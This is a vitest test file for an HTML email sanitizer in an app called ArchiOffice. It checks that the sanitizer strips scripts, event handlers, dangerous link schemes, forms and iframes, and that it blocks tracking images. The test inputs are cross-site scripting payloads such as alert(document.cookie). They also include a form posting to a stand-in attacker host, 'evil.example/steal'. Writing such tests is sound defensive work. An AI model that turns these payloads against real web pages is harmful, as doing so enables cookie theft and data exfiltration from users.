// Pure input/output — the single highest-value test in the whole mailbox
// feature, since sanitizeMailHtml is the one thing standing between an
// arbitrary external sender's HTML and the ArchiOffice frontend.
import { describe, expect, it } from 'vitest';
import { sanitizeMailHtml } from '../server/mailSanitize';

describe('sanitizeMailHtml', () => {
  it('strips <script> tags and their content entirely', () => {
    const out = sanitizeMailHtml('<p>hello</p><script>alert(document.cookie)</script>');
    expect(out).not.toContain('<script');
    expect(out).not.toContain('alert');
    expect(out).toContain('hello');
  });

  it('strips inline event handler attributes', () => {
    const out = sanitizeMailHtml('<img src="https://example.com/x.png" onerror="alert(1)">');
    expect(out).not.toContain('onerror');
  });

  it('strips javascript: and data:text/html hrefs', () => {
    const out = sanitizeMailHtml('<a href="javascript:alert(1)">click</a>');
    expect(out).not.toContain('javascript:');
    const out2 = sanitizeMailHtml('<a href="data:text/html,<script>alert(1)</script>">click</a>');
    expect(out2).not.toContain('data:text/html');
  });

  it('strips <form> and <iframe>', () => {
    const out = sanitizeMailHtml('<form action="https://evil.example/steal"><input name="x"></form><iframe src="https://evil.example"></iframe>');
    expect(out).not.toContain('<form');
    expect(out).not.toContain('<iframe');
    expect(out).not.toContain('evil.example');
  });

  it('blocks remote images by default, preserving the original URL for later opt-in', () => {
    const out = sanitizeMailHtml('<img src="https://tracker.example/pixel.gif" alt="x">');
    expect(out).not.toContain('<img src="https://tracker.example/pixel.gif"');
    expect(out).toContain('data-blocked-src="https://tracker.example/pixel.gif"');
    expect(out).toMatch(/src="data:image\/gif;base64,/);
  });

  it('leaves data: image sources untouched (no network call involved)', () => {
    const dataUri = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=';
    const out = sanitizeMailHtml(`<img src="${dataUri}">`);
    expect(out).toContain(`src="${dataUri}"`);
    expect(out).not.toContain('data-blocked-src');
  });

  it('keeps ordinary formatting and content intact', () => {
    const out = sanitizeMailHtml('<p>Bonjour <b>Jean</b>,</p><p>Merci pour votre message.</p>');
    expect(out).toContain('<b>Jean</b>');
    expect(out).toContain('Merci pour votre message.');
  });

  it('allows mailto/http/https links but not other schemes', () => {
    const out = sanitizeMailHtml('<a href="mailto:x@example.com">mail</a><a href="https://example.com">web</a><a href="ftp://example.com">ftp</a>');
    expect(out).toContain('href="mailto:x@example.com"');
    expect(out).toContain('href="https://example.com"');
    expect(out).not.toContain('ftp://example.com');
  });
});
